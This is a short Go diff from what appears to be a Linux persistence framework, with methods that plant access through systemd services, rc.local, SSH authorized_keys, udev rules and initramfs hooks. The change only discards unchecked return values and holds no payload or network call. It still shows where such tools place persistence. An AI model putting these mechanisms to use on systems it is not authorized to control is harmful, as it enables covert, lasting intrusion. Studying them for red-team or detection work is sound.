@@ -190,10 +190,10 @@ func (m *SystemdServiceMethod) Remove(params *PersistenceParams) error {
 	servicePath := filepath.Join("/etc/systemd/system", serviceName+".cmd")
 
 	cmd := exec.Command("systemctl", "stop", serviceName)
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	cmd = exec.Command("systemctl", "disable", serviceName)
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return os.Remove(servicePath)
 }
@@ -259,7 +259,7 @@ func (m *RCLocalMethod) Install(params *PersistenceParams) (*PersistenceResult, 
 	}
 
 	cmd := exec.Command("chmod", "+x", rcPath)
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return &PersistenceResult{
 		Success: true,
@@ -573,7 +573,7 @@ func (m *LinuxSSHKeysMethod) Install(params *PersistenceParams) (*PersistenceRes
 	}
 
 	cmd := exec.Command("chmod", "600", authorizedKeysPath)
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return &PersistenceResult{
 		Success: true,
@@ -771,7 +771,7 @@ func (m *UdevRuleMethod) Install(params *PersistenceParams) (*PersistenceResult,
 	}
 
 	cmd := exec.Command("udevadm", "control", "--reload-rules")
-	cmd.CombinedOutput()
+	_, _ = cmd.CombinedOutput()
 
 	return &PersistenceResult{
 		Success: true,
@@ -899,8 +899,8 @@ func (m *InitramfsHookMethod) Remove(params *PersistenceParams) error {
 		return fmt.Errorf("initramfs hook method only available on Linux")
 	}
 
-	os.Remove("/etc/initramfs-tools/hooks/persistence")
-	os.Remove("/etc/initramfs-tools/scripts/local-premount/persistence")
+	_ = os.Remove("/etc/initramfs-tools/hooks/persistence")
+	_ = os.Remove("/etc/initramfs-tools/scripts/local-premount/persistence")
 
 	cmd := exec.Command("update-initramfs", "-u")
 	_, err := cmd.CombinedOutput()
